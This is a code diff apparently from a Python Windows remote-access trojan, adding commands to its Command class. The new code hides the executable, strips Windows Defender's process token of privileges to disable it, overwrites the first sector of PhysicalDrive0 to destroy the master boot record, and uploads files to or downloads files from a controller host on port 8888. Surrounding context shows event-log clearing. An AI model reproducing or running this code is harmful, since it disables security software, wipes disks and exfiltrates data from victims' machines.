@@ -928,6 +928,59 @@ class Command:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
+    def hideme():
+        try:
+            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
+            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def killwd():
+        try:
+            if Helper.get_integrity_level() != 'System':
+                return 0, '[-] System permission required'
+            Helper.enable_privilege('SeDebugPrivilege')
+            pid = Helper.get_pid('MsMpEng.exe')
+            handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
+            handle_token = win32security.OpenProcessToken(handle_process, win32con.TOKEN_ALL_ACCESS)
+            Helper.remove_privilege(handle_token, 'SeAssignPrimaryTokenPrivilege')
+            Helper.remove_privilege(handle_token, 'SeBackupPrivilege')
+            Helper.remove_privilege(handle_token, 'SeChangeNotifyPrivilege')
+            Helper.remove_privilege(handle_token, 'SeDebugPrivilege')
+            Helper.remove_privilege(handle_token, 'SeImpersonatePrivilege')
+            Helper.remove_privilege(handle_token, 'SeIncreaseBasePriorityPrivilege')
+            Helper.remove_privilege(handle_token, 'SeIncreaseQuotaPrivilege')
+            Helper.remove_privilege(handle_token, 'SeLoadDriverPrivilege')
+            Helper.remove_privilege(handle_token, 'SeRestorePrivilege')
+            Helper.remove_privilege(handle_token, 'SeSecurityPrivilege')
+            Helper.remove_privilege(handle_token, 'SeShutdownPrivilege')
+            Helper.remove_privilege(handle_token, 'SeSystemEnvironmentPrivilege')
+            Helper.remove_privilege(handle_token, 'SeTakeOwnershipPrivilege')
+            Helper.remove_privilege(handle_token, 'SeTcbPrivilege')
+            untrusted_integrity_sid = win32security.GetBinarySid('S-1-16-0')
+            win32security.SetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel,
+                                              (untrusted_integrity_sid, 28))
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def killmbr():
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                handle_device = win32file.CreateFileW('\\\\.\\PhysicalDrive0', win32con.GENERIC_WRITE,
+                                                      win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None,
+                                                      win32con.OPEN_EXISTING, 0, 0)
+                win32file.WriteFile(handle_device, win32file.AllocateReadBuffer(512), None)
+                win32file.CloseHandle(handle_device)
+                return 1, '[+] Success'
+            else:
+                return 0, '[-] Operation requires elevation'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def clearlog():
         try:
             cmd_list = [r'wevtutil cl System',
@@ -971,12 +1024,41 @@ class Command:
             client.send_text(0, '[-] Error: {}'.format(exception))
 
     @staticmethod
-    def hideme():
+    def webul(client, args):
         try:
-            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
-            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
+            status, result = Helper.parse_arguments({'url': False, 'filename': True}, args)
+            if not status:
+                client.send_text(0, '[-] Error: {}'.format(result))
+                return
+            url = result['url'] if result['url'] else f'http://{client.host}:8888/upload'
+            filename = result['filename']
+            if os.path.isfile(filename):
+                with open(filename, 'rb') as f:
+                    response = requests.post(url, files={'file': f})
+                    client.send_text(1, response.text)
+            else:
+                client.send_text(0, '[-] File not found')
         except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
+            client.send_text(0, '[-] Error: ' + str(exception))
+
+    @staticmethod
+    def webdl(client, args):
+        try:
+            status, result = Helper.parse_arguments({'url': False, 'filename': True}, args)
+            if not status:
+                client.send_text(0, '[-] Error: {}'.format(result))
+                return
+            filename = result['filename']
+            url = result['url'] if result['url'] else f'http://{client.host}:8888/uploads/{filename}'
+            response = requests.get(url)
+            if response.status_code == 200:
+                with open(filename, 'wb') as f:
+                    f.write(response.content)
+                client.send_text(1, '[+] File downloaded successfully')
+            else:
+                client.send_text(0, '[-] ' + str(response.status_code))
+        except Exception as exception:
+            client.send_text(0, '[-] Error: ' + str(exception))
 
     @staticmethod
     def replace_files():
@@ -995,31 +1077,6 @@ class Command:
             return 1, result
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def web_upload(client, filename):
-        try:
-            if os.path.isfile(filename):
-                with open(filename, 'rb') as f:
-                    response = requests.post('http://{0}:8888/upload'.format(client.host), files={'file': f})
-                    client.send_text(1, response.text)
-            else:
-                client.send_text(0, '[-] File not found')
-        except Exception as exception:
-            client.send_text(0, '[-] Error: ' + str(exception))
-
-    @staticmethod
-    def web_download(client, filename):
-        try:
-            response = requests.get('http://{0}:8888/uploads/{1}'.format(client.host, filename))
-            if response.status_code == 200:
-                with open(filename, 'wb') as f:
-                    f.write(response.content)
-                client.send_text(1, '[+] File downloaded successfully')
-            else:
-                client.send_text(0, '[-] ' + str(response.status_code))
-        except Exception as exception:
-            client.send_text(0, '[-] Error: ' + str(exception))
 
     @staticmethod
     def enable_wer():
@@ -1315,6 +1372,12 @@ class Helper:
         output_file.close()
         os.remove(filename)
         os.rename(filename + '.decrypted', filename)
+
+    @staticmethod
+    def remove_privilege(handle_token, privilege):
+        privilege_id = win32security.LookupPrivilegeValue(None, privilege)
+        new_privilege = [(privilege_id, 4)]
+        win32security.AdjustTokenPrivileges(handle_token, 0, new_privilege)
 
 
 class ArgumentParser(argparse.ArgumentParser):
